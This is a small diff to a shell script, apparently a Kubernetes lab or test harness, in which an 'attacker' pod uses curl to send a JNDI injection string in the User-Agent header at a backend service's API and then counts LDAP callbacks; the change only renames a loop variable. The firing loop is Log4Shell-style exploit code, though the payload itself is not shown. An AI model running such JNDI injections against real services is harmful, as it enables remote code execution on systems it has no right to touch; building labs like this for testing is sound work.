@@ -62,7 +62,7 @@ for try in $(seq 1 "$MAXTRIES"); do
   BPORT=$(kubectl -n "$NS" get svc backend -o jsonpath='{.spec.ports[0].port}' 2>/dev/null)
   before=$(ldap_count)
   echo "[try $try] fire JNDI at backend $BIP:$BPORT (x$FIRES)"
-  for i in $(seq 1 "$FIRES"); do
+  for _ in $(seq 1 "$FIRES"); do
     kubectl -n "$ANS" exec deploy/attacker -- curl -s -m5 -A "$JNDI" "http://$BIP:$BPORT/api/products" >/dev/null 2>&1 || true
     sleep 0.5
   done
